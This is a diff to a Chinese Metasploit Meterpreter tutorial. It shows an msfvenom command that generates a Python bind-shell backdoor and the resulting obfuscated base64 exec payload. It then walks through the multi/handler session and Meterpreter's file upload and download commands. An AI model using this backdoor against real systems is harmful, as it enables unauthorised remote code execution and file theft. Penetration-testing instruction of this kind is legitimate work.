@@ -1,6 +1,6 @@
 # Meterpreter of Metasploit教程
 
-## Backdoor生成
+## 0x01 Backdoor生成
 
 ### meterpreter of python
 使用MSF套件中msfvenom进行后门载荷的生成
@@ -15,7 +15,7 @@ msfvenom -p  python/meterpreter/bind_tcp lport=6666 -o /tmp/re111
 exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHpsaWIsYmFzZTY0LHNvY2tldCxzdHJ1Y3QKYj1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpiLmJpbmQoKCcwLjAuMC4wJyw4ODg4KSkKYi5saXN0ZW4oMSkKcyxhPWIuYWNjZXB0KCkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShkKSkseydzJzpzfSkK')[0]))
 ```
 
-## Exploit
+## 0x02 漏洞利用（Exploit）
 使用MSF套件中msfconsole，启动
 ```
 msfconsole
@@ -41,3 +41,24 @@ msf6 exploit(multi/handler) > run
 
 meterpreter >
 ```
+## 0x03 Meterpreter使用
+
+### 上传/下载
+upload
+```
+Usage: upload [options] src1 src2 src3 ... destination
+-r  Upload recursively
+```
+downlaod
+```
+Usage: download [options] src1 src2 src3 ... destination
+
+    -a   Enable adaptive download buffer size
+    -b   Set the initial block size for the download
+    -c   Resume getting a partially-downloaded file
+    -h   Help banner
+    -l   Set the limit of retries (0 unlimits)
+    -r   Download recursively
+    -t   Timestamp downloaded files
+```
+
